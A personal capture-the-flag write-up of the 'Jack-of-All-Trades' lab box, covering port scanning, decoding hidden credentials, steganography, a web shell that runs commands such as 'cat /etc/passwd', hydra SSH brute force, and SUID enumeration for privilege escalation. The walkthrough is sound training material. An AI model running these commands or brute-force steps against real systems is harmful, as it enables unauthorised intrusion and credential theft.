<h1 align="center">Challenge 059 - Jack-of-All-Trades </h1>
<div align="center">
  <img src="https://github.com/user-attachments/assets/9b8a6483-2fa4-4da7-b15b-6536a9a5e0d9" width="90" height="90" />
</div>
<br>
<p align="center"> <b>Difficulty</b>: ?/10 (???) <b>Completed</b>: ✔️  </p>

It's the christmas season so it only feels right to play an appropriate box that has a christmas theme.

Jack is a man of a great many talents. The zoo has employed him to capture the penguins due to his years of penguin-wrangling experience, but all is not as it seems... We must stop him! Can you see through his facade of a forgetful old toymaker and bring this lunatic down?

## User Flag
Reconnaissance is the first step as always so we use nmap.

```
root@ip-10-65-89-82:~# nmap -p- -sV -sC 10.65.185.240
Starting Nmap 7.80 ( https://nmap.org ) at 2025-12-27 11:46 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.65.185.240
Host is up (0.00046s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.21 seconds
```

Port 22 and 80 are open. What I didn't realize at first was that the ports are not running the usual services. 22 is actually running an http service, while port 80 is usually used for SSH.

When trying to access those web pages under their respective ports, we only get the notification that the access is restricted.

<img width="815" height="216" alt="grafik" src="https://github.com/user-attachments/assets/6a6becc2-1325-48ae-be6f-ba0a678c9ed1" />

I tried to check for any hidden directories with gobuster

```
root@ip-10-65-97-154:~# gobuster dir -u http://10.65.185.240:22 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.65.185.240:22
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 318] [--> http://10.65.185.240:22/assets/]
/index.html           (Status: 200) [Size: 1605]
/server-status        (Status: 403) [Size: 278]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Unfortunately acessing those pages through the web browser doesn't seem to be an option so I just tried to use the curl command. With the -L option it allows curl to follow redirects, which is useful since we received a 301 status code for directories like /assets. By checking out the index.html first, we see following output.

```
root@ip-10-65-97-154:~# curl -L http://10.65.185.240:22/index.html
<html>
	<head>
		<title>Jack-of-all-trades!</title>
		<link href="assets/style.css" rel=stylesheet type=text/css>
	</head>
	<body>
		<img id="header" src="assets/header.jpg" width=100%>
		<h1>Welcome to Jack-of-all-trades!</h1>
		<main>
			<p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
			<p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
			<p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
			<p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
			<img src="assets/stego.jpg">
			<p>I make a lot of models myself, but I also do toys, like this one:</p>
			<img src="assets/jackinthebox.jpg">
			<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
			<!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
			<p>I hope you choose to employ me. I love making new friends!</p>
			<p>Hope to see you soon!</p>
			<p id="signature">Jack</p>
		</main>
	</body>
</html>
```

The output of the /assets/ directory is

```
root@ip-10-65-97-154:~# curl -L http://10.65.185.240:22/assets
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /assets</title>
 </head>
 <body>
<h1>Index of /assets</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="header.jpg">header.jpg</a></td><td align="right">2020-02-28 19:37  </td><td align="right"> 69K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="jackinthebox.jpg">jackinthebox.jpg</a></td><td align="right">2020-02-28 19:37  </td><td align="right"> 79K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="stego.jpg">stego.jpg</a></td><td align="right">2020-02-28 19:37  </td><td align="right"> 37K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="style.css">style.css</a></td><td align="right">2020-02-28 19:37  </td><td align="right">171 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.10 (Debian) Server at 10.65.185.240 Port 22</address>
</body></html>
```

Not too shabby. Looking back at the html, we can see that jack had a note to himself hidden in the comment section that says to look in the recovery.php directory, if he ever gets locket out from something. This obviously is very interesting to us.

```
root@ip-10-65-97-154:~# curl -L http://10.65.185.240:22/recovery.php
		
<!DOCTYPE html>
<html>
	<head>
		<title>Recovery Page</title>
		<style>
			body{
				text-align: center;
			}
		</style>
	</head>
	<body>
		<h1>Hello Jack! Did you forget your machine password again?..</h1>	
		<form action="/recovery.php" method="POST">
			<label>Username:</label><br>
			<input name="user" type="text"><br>
			<label>Password:</label><br>
			<input name="pass" type="password"><br>
			<input type="submit" value="Submit">
		</form>
		<!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
		 
	</body>
</html>
```

Interesting seems like we need to insert the right password for the username jack. I just tried out what would happen if we just used the credentials for jack

```
root@ip-10-65-97-154:~# curl -u jack http://10.65.185.240:22
Enter host password for user 'jack':
```

We are immediately begged to insert the password. I didn't knew it yet, but I remembered that the index.html had some base64 encoded message hidden in the comment section. Let's try to decode that first.

<img width="981" height="495" alt="grafik" src="https://github.com/user-attachments/assets/82fbc24f-5ca5-4a38-b75e-500431941754" />

Neat. And with that we can try to login to the machine again.

Changing the configurations in Firefox: Several login attempts through curl led me to the decision to just change around the configurations, as I was fed up with just working with the curl command, so I wrote *about:config* in the search bar of firefox, which gave me the following alert

<img width="738" height="217" alt="Bildschirmfoto vom 2025-12-27 14-48-21" src="https://github.com/user-attachments/assets/28d41ae9-b35d-4b92-8608-a056a6368008" />

Like, whatever. I accepted the risk and continued. In the search bar on the configuration page, we typed *network.security.ports.banned.override* 

<img width="968" height="109" alt="grafik" src="https://github.com/user-attachments/assets/63ab1fd8-fdfe-4353-8eb2-1754c61334ec" />

I clicked "+" and added 22 as the value. Now restarting Firefox would hopefully solve the issue.

After attempting to access the URL again I finally had access.

<img width="972" height="646" alt="grafik" src="https://github.com/user-attachments/assets/16c9cf28-4746-4a70-b1e9-5b9d0bf26d4d" />

It worked! Now I headed to the recovery.php once again to insert those credentials.

<img width="972" height="300" alt="grafik" src="https://github.com/user-attachments/assets/715aeeb3-450b-4330-976a-61215191d139" />

I submitted, but the password didn't seem to have worked out. Seems like curl really wasn't the problem then. Checking the Page Source revealed another Base-Encoding at least.

```
<!DOCTYPE html>
<html>
	<head>
		<title>Recovery Page</title>
		<style>
			body{
				text-align: center;
			}
		</style>
	</head>
	<body>
		<h1>Hello Jack! Did you forget your machine password again?..</h1>	
		<form action="/recovery.php" method="POST">
			<label>Username:</label><br>
			<input name="user" type="text"><br>
			<label>Password:</label><br>
			<input name="pass" type="password"><br>
			<input type="submit" value="Submit">
		</form>
		<!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
		 
	</body>
</html>
```

It looked like a Base32 encoding, so I quickly settled on decoding it like that. 

<img width="1523" height="608" alt="grafik" src="https://github.com/user-attachments/assets/fa985708-106b-48bb-8186-e9208963b343" />

The output itself wasn't really readable either. But it looked like Base16 encoding this time around. I moved on with decoding with that tool.

<img width="1523" height="608" alt="grafik" src="https://github.com/user-attachments/assets/2de36fc0-c1ee-4d45-8442-08782ed66352" />

We were getting closer. At that moment, I wasn't really sure, if what I was doing would lead to anything, but this kind of looked like something that could be readable with ROT13. I just pushed my luck and hoped for the best, and indeed the output made me really happy.

<img width="1771" height="346" alt="grafik" src="https://github.com/user-attachments/assets/12f6c7d3-82ee-4f69-91b4-6e789395c4e0" />

There we go! I checked out the URL that would contain some sort of hint for us.

<img width="1700" height="959" alt="grafik" src="https://github.com/user-attachments/assets/29bb5b61-ffc8-46ae-97dd-ac6c93490e86" />

Now we are able to connect the dots. On the homepage, there was a picture of a Stegosaurus, that was in plain sight. 

<img width="849" height="507" alt="grafik" src="https://github.com/user-attachments/assets/e2eed766-104a-4df6-89b5-4ef111ea5b6d" />

Could be that there is some secret message hidden through Steganography. Honestly the name itself was already giving it away, but I just didn't think of that. Whatever. We use steghide now. I quickly understood, that the password I used beforehand needs to actually be used in here

```
root@ip-10-65-97-154:~# cd Downloads
root@ip-10-65-97-154:~/Downloads# ls
owasp_zap_root_ca.cer  stego.jpg
root@ip-10-65-97-154:~/Downloads# steghide extract -sf stego.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
root@ip-10-65-97-154:~/Downloads# steghide extract -sf stego.jpg
Enter passphrase: 
wrote extracted data to "creds.txt".
```

Ding-ding. That worked out beautifully. Let's check out the text file.

<img width="645" height="181" alt="Bildschirmfoto vom 2025-12-27 15-33-53" src="https://github.com/user-attachments/assets/60838d47-ceb8-4e28-9bb7-39ddbd115c1c" />

Looks like I was fooled... come on now. Well I checked out the rest of the images that we could download for any useful information. The jackinthebox.jpg didn't hold any clues either, but finally the header gave us what we needed.

```
root@ip-10-65-97-154:~/Downloads# steghide extract -sf header.jpg
Enter passphrase: 
wrote extracted data to "cms.creds".
```

<img width="465" height="109" alt="grafik" src="https://github.com/user-attachments/assets/416bfe90-8c0e-43a8-b4c2-b1bc34f1ab55" />

At first I tried to log in through the ssh machine. I forgot the recovery.php completely and was getting confused, why things weren't working out. After gathering myself I realized my mistake and understood what I had to do.

<img width="581" height="159" alt="grafik" src="https://github.com/user-attachments/assets/14065629-e3de-4d90-b764-4531af4cf4f4" />

What is this all about? Maybe we are able to run commands if we just append a query parameter to the URL that indicates the command we want to execute. I tried the following format *http://10.65.185.240:22/nnxhweOV/index.php?cmd=id* and got the following output

```
GET me a 'cmd' and I'll run it for you Future-Jack. uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Very good. From there I moved on using commands like *cat /etc/passwd* and *env* to get more useful information:

```
GET me a 'cmd' and I'll run it for you Future-Jack. root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false uuidd:x:104:109::/run/uuidd:/bin/false Debian-exim:x:105:110::/var/spool/exim4:/bin/false messagebus:x:106:111::/var/run/dbus:/bin/false statd:x:107:65534::/var/lib/nfs:/bin/false avahi-autoipd:x:108:114:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin jack:x:1000:1000:jack,,,:/home/jack:/bin/bash jack:x:1000:1000:jack,,,:/home/jack:/bin/bash
```

None of those were really helpful. After a long while I moved on by checking out the home directory with *ls /home* and got output that would help me out more in my endeavours. 

```
GET me a 'cmd' and I'll run it for you Future-Jack. jack jacks_password_list jacks_password_list
```

We cat the file and out comes:

```
GET me a 'cmd' and I'll run it for you Future-Jack. *hclqAzj+2GC+=0K eN@ 0HguX{,fgXPE;8yF sjRUb4*@pz<*ZITu [8V7o^gl(Gjt5[WB yTq0jI$d}Kae)vC4} 9;}#q*,A4wd{6r,y4krSo ow5APF>6r,y4krSo
```

I thought this could help, but I didn't know where the line break would be. After a long while I realized that I could just try checking the Page Source, which worked. This was very embarassing and took me longer than it should have. Be as it may, at least I was one step closer now.

<img width="420" height="404" alt="grafik" src="https://github.com/user-attachments/assets/a9c06dd1-2b8d-47dd-a8c5-37d67f0ed587" />

I copied that output into the textfile and we could finally brute force now.

```
root@ip-10-65-97-154:~# hydra -l jack -P wordlist.txt -s 80 ssh://10.65.185.240
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-27 16:01:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:1/p:25), ~2 tries per task
[DATA] attacking ssh://10.65.185.240:80/
[80][ssh] host: 10.65.185.240   login: jack   password: ITMJpGGIqg1jn?>@
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-27 16:01:08
```

Get into that ssh now.

```
root@ip-10-65-97-154:~# ssh -p 80 jack@10.65.185.240
jack@10.65.185.240's password: 
jack@jack-of-all-trades:~$ whoami
jack
jack@jack-of-all-trades:~$ ls
user.jpg
```

By analyzing the directory I recognized a jpg file that we could copy into our local machine. Finding the right command for that was a real pain, so I hope this will not take that much time the next time around.

```
root@ip-10-65-97-154:~# scp -P 80 jack@10.65.185.240:user.jpg /
jack@10.65.185.240's password: 
user.jpg                                      100%  286KB  74.1MB/s   00:00
```

The jpg should be found in the / directory now. When we assess it, we can clearly recognize a flag

<img width="708" height="542" alt="Bildschirmfoto vom 2025-12-27 17-33-34" src="https://github.com/user-attachments/assets/e19a6807-da90-4a12-a6c6-87be9d08069f" />

I used a jpg to text converter tool from the internet, as I was too lazy to manually input the flag. This took care of the first half of the challenge. Now it was time for some privilege escalation.

## Root Flag

I tried running the sudo -l command, but that wouldn't help us this time around. To check for SUID (Set User ID) files that we may be able to run, I used the following command.

```
jack@jack-of-all-trades:~$ find / -type f -perm /4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/strings
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/procmail
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su
```

One interesting command that we could abuse for privilege escalation was strings

<img width="943" height="304" alt="grafik" src="https://github.com/user-attachments/assets/7f774dd3-7585-424a-b232-13b05310ab79" />



